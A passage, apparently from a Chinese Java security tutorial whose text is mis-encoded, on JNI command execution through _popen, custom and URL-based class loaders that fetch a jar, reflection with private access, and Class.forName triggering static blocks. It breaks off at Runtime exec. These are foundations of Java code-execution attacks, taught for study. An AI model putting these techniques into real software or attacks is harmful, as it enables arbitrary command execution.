&quot;test.h&quot;JNIEXPORT void JNICALL Java_test_hello(JNIEnv* a, jobject b) &#123; printf(&quot;Hello,World&quot;);&#125; ç¼–è¯‘ä¸ºdllæ–‡ä»¶ã€‚ 5.åœ¨ideaé‡Œä¸ºå½“å‰é¡¹ç›®æŒ‡å®šä¾èµ–dllæ–‡ä»¶è·¯å¾„ å…ˆç‚¹å‡»ç®­å¤´æŒ‡å‘å¤„çš„ç¼–è¾‘é€‰é¡¹ï¼Œç„¶ååœ¨è™šæ‹Ÿæœºé€‰é¡¹é‡Œå¡«ä¸Š-Djava.library.path=ä½ çš„dllè·¯å¾„ 6.æŠŠdllæ–‡ä»¶æ‹–è¿›åˆšåˆšé…ç½®å¥½çš„ä¾èµ–è·¯å¾„ï¼Œè¿è¡Œ JNI æ•°æ®ç±»å‹ JNIç±»å‹æ•°æ®åœ¨cæ–‡ä»¶é‡Œå½“ä½œä¼ å…¥å‚æ•°å’Œè¿”å›ç»“æœï¼Œå‚æ•°ä¼ å…¥åå…¶æ•°æ®ç±»å‹ä¼šè¢«ç”¨æŒ‡å®šæ–¹æ³•è½¬æ¢ä¸ºCç±»å‹ç„¶åè¢«å¤„ç†ï¼Œå¤„ç†å®Œæ¯•åä½¿ç”¨æŒ‡å®šæ–¹æ³•è½¬æ¢ä¸ºJNIç±»å‹è¿”å›ç»™JAVAã€‚ è¿™é‡Œä»‹ç»ä¸€ä¸‹cä¸­JNIç±»å‹ä¸cç±»å‹äº’è½¬çš„å‡½æ•° jstringè½¬char*ï¼šenv-&gt;GetStringUTFChars(str, &amp;jsCopy)char*è½¬jstring: env-&gt;NewStringUTF(&quot;Hello...&quot;)å­—ç¬¦ä¸²èµ„æºé‡Šæ”¾: env-&gt;ReleaseStringUTFChars(javaString, p); JNI å®ç°æœ¬åœ°å‘½ä»¤æ‰§è¡Œç›¸å½“äºä¸€ä¸ªåŠ å¼ºç‰ˆçš„helloworld. é¦–å…ˆæˆ‘ä»¬çœ‹ä¸€ä¸‹ï¼Œå¦‚æœåœ¨c++ä¸­æˆ‘ä»¬æƒ³æ‰§è¡Œæœ¬åœ°å‘½ä»¤æ‰§è¡Œè¯¥å¦‚ä½•æ‰§è¡Œ #include&lt;iostream&gt;#include&lt;stdio.h&gt;#include &lt;string&gt;std::string gogo(const char* cmd) &#123; const char* cmd &#x3D; cmd; FILE* fp &#x3D; _popen(cmd, &quot;r&quot;); if (fp !&#x3D; NULL) &#123; std::string result; char buf[128]; while (fgets(buf, sizeof(buf), fp) !&#x3D; NULL) &#123; result +&#x3D; buf; &#125; return result; &#125;&#125;int main() &#123; std::string result &#x3D; gogo(&quot;dir&quot;); std::cout &lt;&lt; result;&#125; é‚£ä¹ˆæˆ‘ä»¬åœ¨JNIé‡Œå¦‚ä½•å®ç°å‘¢?å…¶å®ä¹Ÿå·®ä¸å¤š. æˆ‘ä»¬ç°åœ¨å†™å¥½javaä»£ç  public class test &#123; static&#123; System.loadLibrary(&quot;Dll2&quot;); &#125; public native String gogo(String cmd); public static void main(String[] args) &#123; test a &#x3D; new test(); String str &#x3D; a.gogo(&quot;dir&quot;); System.out.println(str); &#125;&#125; å†™å¥½c++ä»£ç  #include &quot;test.h&quot;#include&lt;iostream&gt;#include&lt;stdio.h&gt;#include &lt;string&gt;JNIEXPORT jstring JNICALL Java_test_gogo(JNIEnv* env, jobject obj, jstring str) &#123; const char* cmd &#x3D; env-&gt;GetStringUTFChars(str, 0); FILE* fd &#x3D; _popen(cmd, &quot;r&quot;); if (fd !&#x3D; NULL) &#123; std::string result; char buf[128]; while (fgets(buf, sizeof(buf), fd) !&#x3D; NULL) &#123; result +&#x3D; buf; &#125; _pclose(fd); return env-&gt;NewStringUTF(result.c_str()); &#125;&#125; è¿è¡Œç»“æœ ç±»åŠ è½½å™¨ClassLoaderåœ¨JVMç±»åŠ è½½å™¨ä¸­æœ€é¡¶å±‚çš„æ˜¯Bootstrap ClassLoader(å¼•å¯¼ç±»åŠ è½½å™¨)ã€Extension ClassLoader(æ‰©å±•ç±»åŠ è½½å™¨)ã€App ClassLoader(ç³»ç»Ÿç±»åŠ è½½å™¨)ï¼ŒAppClassLoaderæ˜¯é»˜è®¤çš„ç±»åŠ è½½å™¨ï¼Œå¦‚æœç±»åŠ è½½æ—¶æˆ‘ä»¬ä¸æŒ‡å®šç±»åŠ è½½å™¨çš„æƒ…å†µä¸‹ï¼Œé»˜è®¤ä¼šä½¿ç”¨AppClassLoaderåŠ è½½ç±»ï¼ŒClassLoader.getSystemClassLoader()è¿”å›çš„ç³»ç»Ÿç±»åŠ è½½å™¨ä¹Ÿæ˜¯AppClassLoaderã€‚ ClassLoaderçš„ä¸»è¦æ–¹æ³•æœ‰ä»¥ä¸‹å‡ ä¸ªï¼š loadClass(åŠ è½½æŒ‡å®šçš„Javaç±») findClass(æŸ¥æ‰¾æŒ‡å®šçš„Javaç±») findLoadedClass(æŸ¥æ‰¾JVMå·²ç»åŠ è½½è¿‡çš„ç±») defineClass(ä»byte[]è·å¾—ä¸€ä¸ªJavaç±») resolveClass(é“¾æ¥æŒ‡å®šçš„Javaç±») å¦‚ä½•é€šè¿‡ClassLoaderè·å–ä¸€ä¸ªç±»å¯¹è±¡ï¼Ÿå¾ˆç®€å• Class a &#x3D; ClassLoader.getSystemClassLoader().loadClass(&quot;java.lang.Runtime&quot;); å®ƒå¯¹ä¸€ä¸ªç±»çš„åŠ è½½æµç¨‹å¦‚ä¸‹: ClassLoaderè°ƒç”¨loadClass(String name)æ–¹æ³•åŠ è½½æŒ‡å®šç±» è°ƒç”¨findLoadedClassæ£€æŸ¥æŒ‡å®šçš„ç±»æ˜¯å¦å·²ç»åˆå§‹åŒ–ï¼Œè‹¥å·²åˆå§‹åŒ–åˆ™ç›´æ¥è¿”å›ç±»å¯¹è±¡ å¦‚æœåˆ›å»ºClassLoaderæ—¶ä¼ å…¥çˆ¶ç±»åŠ è½½å™¨ï¼Œåˆ™ä½¿ç”¨çˆ¶ç±»åŠ è½½å™¨åŠ è½½æŒ‡å®šç±»ï¼Œå¦åˆ™ä½¿ç”¨JVMçš„Bootstrap ClassLoaderï¼ˆå¼•å¯¼ç±»åŠ è½½å™¨ï¼‰åŠ è½½ å¦‚æœä»¥ä¸Šæ­¥éª¤æ²¡æœ‰å®ŒæˆåŠ è½½ï¼Œåˆ™ä½¿ç”¨findClassæ–¹æ³•å°è¯•åŠ è½½æŒ‡å®šç±» å¦‚æœå½“å‰ClassLoaderç±»æ²¡æœ‰é‡å†™findClassæ–¹æ³•åˆ™ç›´æ¥è¿”å›å¼‚å¸¸ã€‚è‹¥é‡å†™äº†è¯¥æ–¹æ³•ä¸”é€šè¿‡findClassæ‰¾åˆ°äº†ä¼ å…¥çš„ç±»åçš„å¯¹åº”çš„ç±»å­—èŠ‚ç ï¼Œé‚£ä¹ˆå°±ä¼šä½¿ç”¨defineClasså»JVMæ³¨å†Œè¯¥ç±» å¦‚æœloadClassè°ƒç”¨æ—¶ä¼ å…¥resolveçš„å‚æ•°ä¸ºtrueï¼Œåˆ™é‚£ä¹ˆè¿˜éœ€è¦è°ƒç”¨resolveClassæ–¹æ³•è¿æ¥ç±»ã€‚è¯¥å‚æ•°é»˜è®¤ä¸ºfalse è¿”å›è¢«JVMåŠ è½½åçš„æŒ‡å®šç±»çš„ç±»å¯¹è±¡ ClassLoaderè‡ªå®šä¹‰java.lang.ClassLoader æ˜¯æ‰€æœ‰ç±»åŠ è½½å™¨çš„çˆ¶ç±»ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡é‡å†™å…¶findClassæ–¹æ³•æ¥å®ç°è‡ªå®šä¹‰ClassLoaderã€‚ æˆ‘ä»¬è¯•ç€è‡ªå®šä¹‰ä¸€ä¸ªï¼Œå½“å¯¹loadClassä¼ å…¥com.anbai.sec.classloader.TestHelloWorld æ—¶ä¼šç›´æ¥è¿”å›ä¸€ä¸ªåœ¨åŠ è½½å™¨é‡Œå·²ç»å®šä¹‰å¥½äº†çš„å¯¹åº”ç±»çš„ç±»å¯¹è±¡ã€‚ class TestClassLoader extends ClassLoader&#123; String testClassName&#x3D;&quot;com.anbai.sec.classloader.TestHelloWorld&quot;; byte[] testClassBytes &#x3D; new byte[]&#123;-54, -2, -70, -66, 0, 0, 0, 51, 0, 17, 10, 0, 4, 0, 13, 8, 0, 14, 7, 0, 15, 7, 0, 16, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 5, 104, 101, 108, 108, 111, 1, 0, 20, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 19, 84, 101, 115, 116, 72, 101, 108, 108, 111, 87, 111, 114, 108, 100, 46, 106, 97, 118, 97, 12, 0, 5, 0, 6, 1, 0, 12, 72, 101, 108, 108, 111, 32, 87, 111, 114, 108, 100, 126, 1, 0, 40, 99, 111, 109, 47, 97, 110, 98, 97, 105, 47, 115, 101, 99, 47, 99, 108, 97, 115, 115, 108, 111, 97, 100, 101, 114, 47, 84, 101, 115, 116, 72, 101, 108, 108, 111, 87, 111, 114, 108, 100, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 0, 33, 0, 3, 0, 4, 0, 0, 0, 0, 0, 2, 0, 1, 0, 5, 0, 6, 0, 1, 0, 7, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 7, 0, 1, 0, 9, 0, 10, 0, 1, 0, 7, 0, 0, 0, 27, 0, 1, 0, 1, 0, 0, 0, 3, 18, 2, -80, 0, 0, 0, 1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 10, 0, 1, 0, 11, 0, 0, 0, 2, 0, 12&#125;; &#x2F;&#x2F;è¿™éƒ¨åˆ†æ˜¯ç±»å­—èŠ‚ç ï¼Œæ˜¯æˆ‘ä»åˆ«äººé‚£é‡Œå«–çš„ @Override protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123; if(name.equals(&quot;com.anbai.sec.classloader.TestHelloWorld&quot;))&#123; return defineClass(testClassName,testClassBytes,0,testClassBytes.length); &#125; else&#123; return super.findClass(name); &#125; &#125;&#125; ç„¶åä¸»å‡½æ•°æˆ‘ä»¬å†™ public static void main(String[] args) &#123; try &#123; TestClassLoader Loader &#x3D; new TestClassLoader(); Class clazz &#x3D; Loader.loadClass(&quot;com.anbai.sec.classloader.TestHelloWorld&quot;); Object Instance &#x3D; clazz.newInstance(); Method method &#x3D; Instance.getClass().getMethod(&quot;hello&quot;); String str &#x3D; (String) method.invoke(Instance); System.out.println(str); &#125;catch (Exception e)&#123;&#125;&#125; ç»æµ‹è¯•ç¨‹åºæ­£å¸¸è¿è¡Œã€‚æˆ‘ä»¬çš„è‡ªå®šä¹‰ClassLoaderå°±å†™å¥½äº†ã€‚å½“ç„¶è¿˜æœ‰æ›´å¤šèŠ±é‡Œèƒ¡å“¨çš„é‡å†™æ–¹æ³•ï¼Œæˆ‘ä»¬è¿™é‡Œåªæ˜¯çŸ¥é“æ€ä¹ˆé‡å†™å³å¯ã€‚ URLClassLoaderURLClassLoaderä¹Ÿæ˜¯ClassLoaderç±»ä¸‹çš„ä¸€ä¸ªé‡å†™ç±»ã€‚è¿™ä¸ªç±»å¾ˆå¥½ç”¨ï¼Œå®ƒå¯ä»¥é€šè¿‡ç½‘ç»œåè®®è·å–è¿œç¨‹çš„jaråŒ…ï¼Œç„¶åé€šè¿‡ç±»åŠ è½½å™¨å»è·å¾—å…¶ä¸­çš„æŒ‡å®šç±»çš„ç±»å¯¹è±¡ã€‚è¯•è¯•å§ã€‚ æµç¨‹æ˜¯å…ˆå®šä¹‰ä¸€ä¸ªURLå¯¹è±¡æŒ‡å‘æˆ‘ä»¬çš„jaråŒ…ï¼Œç„¶åå®ä¾‹åŒ–ä¸€ä¸ªURLClassLoaderå¯¹è±¡ï¼Œç„¶åé€šè¿‡loadClassåŠ è½½æŸä¸ªç±»è·å¾—ç±»å¯¹è±¡ã€‚ import java.lang.reflect.Field;import java.lang.reflect.Method;import java.net.URL;import java.net.URLClassLoader;public class test &#123; public static void main(String[] args)&#123; try&#123;&#x2F;&#x2F; Class clazz &#x3D; ClassLoader.getSystemClassLoader().loadClass(&quot;fuck&quot;);&#x2F;&#x2F; Method method &#x3D; clazz.getMethod(&quot;func1&quot;,int.class);&#x2F;&#x2F; method.invoke(clazz.newInstance(),123); URL url &#x3D; new URL(&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;LOL.jar&quot;); URLClassLoader Loader &#x3D; new URLClassLoader(new URL[]&#123;url&#125;); Class clazz &#x3D; Loader.loadClass(&quot;fuck&quot;); Method method &#x3D; clazz.getMethod(&quot;func1&quot;,int.class); method.setAccessible(true); method.invoke(clazz.newInstance(),123); &#125; catch (Exception e)&#123; e.printStackTrace(); &#125; &#125;&#125; ç„¶åæˆ‘ä»¬jaråŒ…é‡Œçš„classæ˜¯è¿™ä¸ª.JAVAçš„ç¼–è¯‘æ–‡ä»¶ public class fuck&#123; public void func1(int input1)&#123; System.out.print(input1); &#125;&#125; æ‰§è¡Œç»“æœ åå°„åå°„çš„åŸºç¡€åå°„æ˜¯javaçš„ä¸€ä¸ªç‰¹æ€§ï¼Œç”¨äºè·å–ç±»çš„è¯¦ç»†ä¿¡æ¯ï¼ˆæ–¹æ³•ï¼Œå˜é‡ï¼‰ï¼Œå¹¶å¯ä»¥æ‰§è¡Œç±»ä¸­çš„æ–¹æ³•ã€‚ è·å¾—ä¸€ä¸ªç±»çš„ç±»å¯¹è±¡è¦è·å–ç±»çš„è¯¦ç»†ä¿¡æ¯æˆ–æ‰§è¡Œå…¶ä¸­çš„æ–¹æ³•ï¼Œé¦–å…ˆè‚¯å®šæ˜¯è¦è·å–åˆ°é‚£ä¸ªç±»çš„ç±»å¯¹è±¡ æ–¹æ³•ä¸€:æˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªClassç±»å‹çš„å˜é‡ï¼Œç”¨äºæ¥æ”¶Class.forname(â€œç±»â€)è¿”å›çš„ç±»å¯¹è±¡ã€‚è¿™ä¸ªæ–¹æ³•å¿…é¡»é€šè¿‡try..catch æ¥å¤„ç†å…¶ä¸­ClassNotFoundException try&#123;Class clazz &#x3D; Class.forname(&quot;java.lang.String&quot;)ï¼›&#125;catch(ClassNotFoundException e)&#123;&#125; æ–¹æ³•äºŒ:æˆ‘ä»¬å®ä¾‹åŒ–ä¸€ä¸ªç±»çš„å¯¹è±¡å‡ºæ¥ï¼Œç„¶åé€šè¿‡ å¯¹è±¡.getClass()è·å¾—å…¶ç±»å¯¹è±¡ String a &#x3D; new String;Class clazz &#x3D; a.getclass(); æ–¹æ³•ä¸‰:ä½¿ç”¨.class Class clazz &#x3D; String.class; è¿™æ ·ï¼Œæˆ‘ä»¬å°±è·å¾—ä¸€ä¸ªæŒ‡å®šç±»çš„ç±»å¯¹è±¡äº†ã€‚å¾ˆç®€å•ã€‚æˆ‘ä»¬å¯ä»¥å¯¹ä¸€ä¸ªç±»å¯¹è±¡ä½¿ç”¨getName()æ–¹æ³•è·å–å…¶ç±»åã€‚ System.out.println(clazz.getName()); è·å–ä¸€ä¸ªç±»å¯¹è±¡çš„æ‰€æœ‰æˆå‘˜è·å–å±æ€§å¹¶ä¿®æ”¹å¯¹ç±»å¯¹è±¡ä½¿ç”¨ getFields() æˆ– getDeclaredFields() æ–¹æ³•å³å¯è·å¾—å±æ€§æ•°ç»„ï¼ŒåŒºåˆ«åœ¨äºå‰è€…åªèƒ½è·å–å…¬æœ‰å±æ€§ï¼Œåè€…èƒ½è·å–ç§æœ‰å±æ€§ã€‚ç„¶åéå†å±æ€§æ•°ç»„ï¼Œé€šè¿‡å¯¹æ¯ä¸€é¡¹æ‰§è¡ŒgetName()è·å–å±æ€§åï¼Œget(å®ä¾‹åŒ–çš„å¯¹è±¡)è·å¾—å±æ€§å€¼ç„¶åå¯¹æŸä¸€é¡¹è¿›è¡Œ.set()å¯¹å…¶è¿›è¡Œä¿®æ”¹è¿™é‡Œéœ€è¦æçš„æ˜¯ï¼Œå¦‚æœè¦è·å¾—æˆ–ä¿®æ”¹ç§æœ‰å±æ€§çš„å€¼çš„æ—¶å€™ï¼Œéœ€è¦å¯¹ç§æœ‰å±æ€§ä½¿ç”¨setAccessible(true)æ¥å®ç°ç§æœ‰è®¿é—® import java.lang.reflect.Field;public class test &#123; public static void main(String[] args)&#123; Class clazz &#x3D; (new abc()).getClass(); abc test &#x3D; new abc(); Field[] Fields &#x3D; clazz.getDeclaredFields(); for(Field Field:Fields)&#123; &#x2F;&#x2F;éå†Fieldsæ•°ç»„ try &#123; &#x2F;&#x2F;æ‰§è¡Œget()æ–¹æ³•æ—¶éœ€æŠ›å‡ºIllegalAccessExceptioné”™è¯¯ Field.setAccessible(true); &#x2F;&#x2F;å¯¹æ•°ç»„ä¸­çš„æ¯ä¸€é¡¹å®ç°ç§æœ‰è®¿é—® System.out.print(Field.getName()); Object value &#x3D; Field.get(new abc()); System.out.println(&quot;:&quot; + value); Field.set(test,&quot;new&quot;); &#x2F;&#x2F;ä¿®æ”¹testå¯¹è±¡ä¸­çš„å˜é‡ &#125; catch (Exception e)&#123; &#125; &#125; System.out.println(test.a); &#125;&#125;class abc&#123; public String a &#x3D;new String(&quot;tom and mary&quot;); private String b &#x3D; new String(&quot;abcdefg&quot;);&#125; è¿è¡Œç»“æœ å¦å¤–ï¼Œä½ ä¹Ÿå¯ä»¥é€šè¿‡getFiled(â€œå±æ€§åâ€)æ¥è·å–ç‰¹å®šå±æ€§çš„Filedå¯¹è±¡ï¼Œ getDeclaredFields() åŒç† è·å–æ–¹æ³•å¹¶æ‰§è¡Œæ¥ä¸‹æ¥æ˜¯è·å–æ–¹æ³•çš„ä¸€äº›ä¿¡æ¯æˆ‘ä»¬é€šè¿‡getMethodè·å–æ–¹æ³•å¯¹è±¡ï¼Œç„¶åé€šè¿‡getNameè·å–æ–¹æ³•åï¼ŒgetReturnTypeè·å–è¿”å›å€¼ç±»å‹ï¼ŒgetParameterTypesè·å–ä¼ å…¥çš„å‚æ•°ç±»å‹ import java.lang.reflect.Field;import java.lang.reflect.Method;public class test &#123; public static void main(String[] args)&#123; Class clazz &#x3D; (new abc()).getClass(); Method[] methods &#x3D; clazz.getDeclaredMethods(); for(Method method:methods)&#123; try&#123; System.out.print(method.getName()); System.out.print(&quot;|retrunType:&quot;+method.getReturnType()+&quot;|&quot;); Class[] ParameterTypes &#x3D; method.getParameterTypes(); for(Class ParameterType:ParameterTypes)&#123; System.out.print(&quot;ParamType:&quot;+ParameterType.getName()); &#125; System.out.println(&quot;&quot;); &#125; catch (Exception e)&#123; &#125; &#125; &#125;&#125;class abc&#123; public int a &#x3D;1; private String b &#x3D; new String(&quot;abcdefg&quot;); public void func1(int input1)&#123; System.out.print(input1); &#125; private void func2(int input1)&#123; System.out.print(input1); &#125;&#125; æ¥ä¸‹æ¥æ˜¯å¯¹methodå¯¹è±¡æ‰§è¡Œinvokeæ–¹æ³•è°ƒç”¨ï¼Œé€šè¿‡ä¼ å…¥å‚æ•°ï¼ŒæŒ‡å®šå¯¹è±¡ï¼Œå³å¯è°ƒç”¨è¯¥æ–¹æ³•ã€‚æˆ‘åœ¨ä¸Šè¿°ä»£ç ä¸­æ·»åŠ äº†ä¿®æ”¹ import java.lang.reflect.Field;import java.lang.reflect.Method;public class test &#123; public static void main(String[] args)&#123; Class clazz &#x3D; (new abc()).getClass(); Method[] methods &#x3D; clazz.getDeclaredMethods(); for(Method method:methods)&#123; try&#123; System.out.print(method.getName()); System.out.print(&quot;|retrunType:&quot;+method.getReturnType()+&quot;|&quot;); Class[] ParameterTypes &#x3D; method.getParameterTypes(); for(Class ParameterType:ParameterTypes)&#123; System.out.print(&quot;ParamType:&quot;+ParameterType.getName()); &#125; System.out.println(&quot;&quot;); method.setAccessible(true); &#x2F;&#x2F;æ‰“å¼€ç§æœ‰è®¿é—® method.invoke(new abc(),2); &#x2F;&#x2F;new è¿™é‡Œinvokeç¬¬ä¸€ä¸ªå‚æ•°æŒ‡å®šå®ä¾‹åŒ–å¯¹è±¡ï¼Œä¹‹åçš„å‚æ•°ä»£è¡¨ä¼ å…¥æ–¹æ³•çš„å‚æ•° &#125; catch (Exception e)&#123; &#125; &#125; &#125;&#125;class abc&#123; public int a &#x3D;1; private String b &#x3D; new String(&quot;abcdefg&quot;); public void func1(int input1)&#123; System.out.print(input1); &#125; private void func2(int input1)&#123; System.out.print(input1); &#125;&#125; è·å–æ„é€ æ–¹æ³•å¹¶æ‰§è¡Œè·å¾—æ„é€ æ–¹æ³•ï¼Œä¸»è¦æ˜¯é€šè¿‡ getConstructors()å’ŒgetDeclaredConstructors() ï¼Œåè€…èƒ½è®¿é—®ç§æœ‰å¯¹è±¡,ä¸‹é¢æ˜¯ç”¨éå†æ³•è·å¾—æ‰€æœ‰æ„é€ å‡½æ•°ä¿¡æ¯ import java.lang.reflect.Constructor;public class test &#123; public static void main(String[] args)&#123; try&#123; Class clazz &#x3D; Class.forName(&quot;abc&quot;); Constructor[] conArray &#x3D; clazz.getDeclaredConstructors(); for (Constructor a:conArray)&#123; a.setAccessible(true); System.out.println(a); &#125; &#125; catch(Exception e)&#123; &#125; &#125;&#125;class abc&#123; public abc(String name,int age)&#123; System.out.println(&quot;å§“åï¼š&quot;+name+&quot;å¹´é¾„ï¼š&quot;+ age); &#125; private abc(int age)&#123; System.out.println(&quot;ç§æœ‰çš„æ„é€ æ–¹æ³• å¹´é¾„ï¼š&quot;+ age); &#125;&#125; è¿è¡Œç»“æœ æˆ‘ä»¬åˆšæ‰æè¿‡,getFiled()é™„å¸¦å‚æ•°å¯ä»¥æŒ‡å®šè®¿é—®æŸä¸€ä¸ªå±æ€§ï¼ŒåŒç†ï¼ŒgetConstructorä¹Ÿä¸€æ ·ï¼Œæˆ‘ä»¬æƒ³è¦æ‰§è¡ŒæŸä¸€ä¸ªç±»çš„æ„é€ æ–¹æ³•ï¼Œå¾€å¾€è¿™ä¸ªæ–¹æ³•æ›´å®ç”¨è¦æ‰§è¡Œä¸€ä¸ªç±»çš„æ„é€ æ–¹æ³•ï¼Œé‚£æˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªè¯¥ç±»çš„å®ä¾‹åŒ–å¯¹è±¡ï¼Œè¿™ä¸ªè¿‡ç¨‹æˆ‘ä»¬ç”¨newInstance()æ–¹æ³•å®ç° import java.lang.reflect.Constructor;public class test &#123; public static void main(String[] args)&#123; try&#123; Class clazz &#x3D; Class.forName(&quot;abc&quot;); Constructor test &#x3D; clazz.getDeclaredConstructor(int.class); &#x2F;&#x2F;æŒ‡å®šå‚æ•°ï¼Œå³å¯ä»å¤šä¸ªé‡è½½çš„æ„é€ å‡½æ•°æŒ‡å®šåˆ°æŸä¸ªå…·ä½“çš„æ„é€ å‡½æ•° test.setAccessible(true); test.newInstance(12); &#x2F;&#x2F;ç§æœ‰æ„é€ æ–¹æ³•åªéœ€è°ƒç”¨ä¸€ä¸‹newInstanceä¼ å…¥å‚æ•°å³å¯ Constructor test2 &#x3D; clazz.getDeclaredConstructor(String.class,int.class); test2.newInstance(&quot;tom&quot;,15); &#x2F;&#x2F;å…¬æœ‰æ„é€ æ–¹æ³•ä¹Ÿä¸€æ · &#125; catch(Exception e)&#123; &#125; &#125;&#125;class abc&#123; public abc(String name,int age)&#123; System.out.println(&quot;å§“åï¼š&quot;+name+&quot;å¹´é¾„ï¼š&quot;+ age); &#125; private abc(int age)&#123; System.out.println(&quot;ç§æœ‰çš„æ„é€ æ–¹æ³• å¹´é¾„ï¼š&quot;+ age); &#125;&#125; æ‰§è¡Œç»“æœ åå°„çš„è¿›é˜¶ä¸å®‰å…¨Class.forName å®è´¨ä¸ç±»åˆå§‹åŒ–Class.forName(â€œâ€¦â€) å¸¸è¢«æˆ‘ä»¬æ‹¿æ¥è·å¾—ç±»å¯¹è±¡ï¼Œä½†æ˜¯å®é™…ä¸Šï¼ŒClass.fornameæœ‰ä¸‰ä¸ªå‚æ•°ï¼Œåªä¸è¿‡æˆ‘ä»¬é»˜è®¤è¾“ç¬¬ä¸€ä¸ªå‚æ•°ï¼šç±»åå°±èƒ½å®Œæˆå·¥ä½œäº†ã€‚ è¿™æ˜¯Class.fornNameå‡½æ•°åŸå‹public static Class&lt;?&gt; forName(String name, boolean initialize, ClassLoader loader)Class.forName(className)&#x2F;&#x2F; ç­‰äºClass.forName(className, true, currentLoader) è¿™é‡Œæˆ‘ä»¬çœ‹è§æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æŒ‡å®šç±»åå°±ä¸å¤šè®²äº†ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å†³å®šç±»æ˜¯å¦åˆå§‹åŒ–ï¼ˆè¿™ä¸ªç¨åä¼šè¯¦ç»†é˜æ˜ï¼‰ï¼Œç¬¬ä¸‰ä¸ªæ˜¯ClassLoaderç±»åŠ è½½å™¨ï¼ˆå‘Šè¯‰JVMå¦‚ä½•åŠ è½½è¿™ä¸ªç±»è¿™é‡Œä¸å±•å¼€è¯´ï¼‰ å…³äºä¸€ä¸ªç±»çš„åˆå§‹åŒ–ï¼Œæœ‰ä¸‰ç§æ“ä½œå¯ä»¥å®ç°:æ„é€ æ–¹æ³•ï¼Œç©ºå—å’Œstaticå—ï¼Œå°±åƒè¿™æ · public class TrainPrint &#123; &#123; System.out.printf(&quot;Empty block initial %s\\n&quot;, this.getClass()); &#125; static &#123; System.out.printf(&quot;Static initial %s\\n&quot;, TrainPrint.class); &#125; public TrainPrint() &#123; System.out.printf(&quot;Initial %s\\n&quot;, this.getClass()); &#125;&#125; é‚£ä¹ˆæ‰§è¡Œé¡ºåºæ˜¯å¦‚ä½•å‘¢ï¼Œåœ¨å¼•å…¥çˆ¶ç±»çš„æƒ…å†µä¸‹åˆæ˜¯å¦‚ä½•å‘¢ï¼Ÿæˆ‘ä»¬å†™ä¸ªdemoçœ‹çœ‹ import java.lang.reflect.Constructor;public class test &#123; public static void main(String[] args)&#123; abc a &#x3D; new abc(); &#125;&#125;class b&#123; &#123; System.out.println(&quot;bç©ºå—å·²æ‰§è¡Œ&quot;); &#125; static&#123; System.out.println(&quot; b staticå—å·²æ‰§è¡Œ&quot;); &#125; public b()&#123; System.out.println(&quot;bç±»æ„é€ æ–¹æ³•å·²æ‰§è¡Œ&quot;); &#125;&#125;class abc extends b&#123; &#123; System.out.println(&quot;aç©ºå—å·²æ‰§è¡Œ&quot;); &#125; static&#123; System.out.println(&quot; a staticå—å·²æ‰§è¡Œ&quot;); &#125; public abc() &#123; System.out.println(&quot;aåˆå§‹åŒ–æ–¹æ³•å·²æ‰§è¡Œ&quot;); &#125;&#125; æˆ‘ä»¬å¯ä»¥æ¸…æ™°çš„çœ‹åˆ°æ‰§è¡Œé¡ºåºï¼Œå¯¹ç»§æ‰¿ç±»æ¥è¯´ï¼Œ1.ä¼šå…ˆæ‰§è¡Œçˆ¶ç±»staticå—2.æ‰§è¡Œè‡ªå·±çš„staticå—3.æ‰§è¡Œçˆ¶ç±»ç©ºå¿«4.æ‰§è¡Œçˆ¶ç±»æ„é€ æ–¹æ³•5.æ‰§è¡Œè‡ªå·±ç©ºå¿«6.æ‰§è¡Œè‡ªå·±æ„é€ æ–¹æ³• å¯¹äºä¸€ä¸ªç±»æ¥è¯´ï¼Œæ‰§è¡Œé¡ºåºåˆ™æ˜¯1.æ‰§è¡Œstaticå—2.æ‰§è¡Œç©ºå¿«3.æ‰§è¡Œæ„é€ æ–¹æ³• é‚£ä¹ˆå¯¹äºClass.forNameæŒ‡å®šçš„æ˜¯å¦è¿›è¡Œç±»åˆå§‹åŒ–å‚æ•°ï¼ŒæŒ‡çš„æ˜¯å“ªä¸ªéƒ¨åˆ†ï¼Ÿstaticå—ï¼Œç©ºå—è¿˜æ˜¯æ„é€ æ–¹æ³•?ç­”æ¡ˆæ˜¯åªä¼šæ‰§è¡Œstaticå—é‡Œçš„ï¼Œä¸”ä¼šä¼˜å…ˆæ‰§è¡Œçˆ¶ç±»çš„staticå—ã€‚æˆ‘ä»¬æŠŠä¸Šé¢ä»£ç ä¸­çš„ä¸»å‡½æ•°æ›¿æ¢ä¸º try &#123; Class clazz &#x3D; Class.forName(&quot;abc&quot;);&#125;catch (Exception e)&#123;&#125; æ‰§è¡Œä¸€ä¸‹ï¼Œçœ‹ç»“æœã€‚å‘ç°åªæ‰§è¡Œäº†staticå— ä¹Ÿå°±æ˜¯è¯´ï¼ŒClass.forName()ä¼šé»˜è®¤æ‰§è¡Œç±»çš„staticä»£ç å—ï¼Œæ˜¯ä¸ªæ¯”è¾ƒå±é™©çš„ä¿¡å·ã€‚å¦å¤–ä¸€æï¼Œxxx.class.newinstance() ä¼šè‡ªåŠ¨è°ƒç”¨ç±»çš„æ„é€ æ–¹æ³•ã€‚ Runtimeæ‰§è¡Œå‘½ä»¤è§£æä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬è°ƒç”¨Runtimeç±»æ¥æ‰§è¡Œå‘½ä»¤æ—¶çš„æŒ‡å®šæ˜¯è¿™æ ·çš„ Runtime.getRuntime().exe() 